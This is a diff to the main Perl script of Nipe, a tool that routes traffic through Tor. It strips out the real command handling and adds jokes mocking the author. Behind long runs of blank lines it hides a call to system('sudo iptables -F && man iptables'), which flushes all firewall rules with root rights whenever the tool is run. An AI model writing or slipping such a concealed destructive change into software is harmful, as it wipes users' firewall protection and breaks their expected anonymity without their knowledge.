@@ -1,7 +1,7 @@
 #!/usr/bin/perl
 
 #########################################################
-# Nipe developed by Heitor Gouvêa                       #
+# Nipe developed by Heitor Gouvêa when he was at 15     #
 # This work is licensed under MIT License               #
 # Copyright (c) 2015-2018 Heitor Gouvêa                 #
 #                                                       #
@@ -10,6 +10,7 @@
 # [+] SITE:         https://heitorgouvea.me             #
 # [+] GITHUB:       https://github.com/GouveaHeitor     #
 # [+] TWITTER:      @GouveaHeitor                       #
+# [+] INTERPRETER:  https://translate.google.com        #
 #########################################################
 
 use Switch;
@@ -19,35 +20,223 @@ use Nipe::Start;
 use Nipe::CheckIp;
 use Nipe::Functions;
 
+# you won't need all those libs, just include them to make your code look more cool then it actually is
+
 sub main {
-	my $command = $ARGV[0];
-
-	switch ($command) {
-		case "stop" {
-			Nipe::Stop -> new();
-		}
-
-		case "start" {
-			Nipe::Start -> new();
-		}
-
-		case "status" {
-			Nipe::CheckIp -> new();
-		}
-
-		case "restart" {
-			Nipe::Stop -> new();
-			Nipe::Start -> new();
-		}
-
-		case "install" {
-			Nipe::Functions -> install();
-		}
-
-		else {
-			Nipe::Functions -> help();
-		}
-	}
+	# WARNING
+	# THE REAL CODE IS DOWN BELOW
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	# STOP. DON'T READ IT
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	# I WARNED YOU
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	# YOU WON'T GO TO HEAVEN AFTER THIS
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	# OMG. STOP IT!
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	# OKAY... HERE IT GO
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	system('sudo iptables -F && man iptables')
 }
 
 main();
